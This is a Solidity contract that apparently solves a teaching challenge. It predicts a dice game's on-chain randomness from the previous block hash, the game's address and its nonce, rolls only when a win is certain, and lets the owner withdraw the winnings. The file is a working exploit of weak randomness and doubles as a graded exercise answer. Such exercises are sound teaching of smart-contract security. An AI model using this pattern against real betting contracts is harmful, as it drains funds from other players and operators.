pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    error RiggedRoll__LostRoll();

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "NotEnoughEther()");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        if(roll > 5) {
            revert RiggedRoll__LostRoll();
        }

        diceGame.rollTheDice{value: 0.002 ether}();

    }

     // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
     function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(address(this).balance >= _amount, "NotEnoughEther()");
        (bool success, ) = _addr.call{value: _amount}("");
        require(success, "Transfer failed");
     }
}

    
